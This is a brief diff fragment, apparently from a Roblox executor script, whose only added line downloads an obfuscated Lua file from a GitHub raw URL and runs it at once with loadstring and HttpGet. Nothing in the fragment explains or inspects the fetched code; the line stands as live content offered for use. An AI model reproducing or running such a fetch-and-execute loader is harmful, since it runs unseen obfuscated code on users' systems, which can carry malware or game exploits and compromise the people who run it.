@@ -21,3 +21,4 @@ Co-Owner=ibay_executor/ib4ykuruto]
 
 
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ib4444778/1341GUIv1/refs/heads/main/obfuscated_script-1778586865980.lua.txt"))()
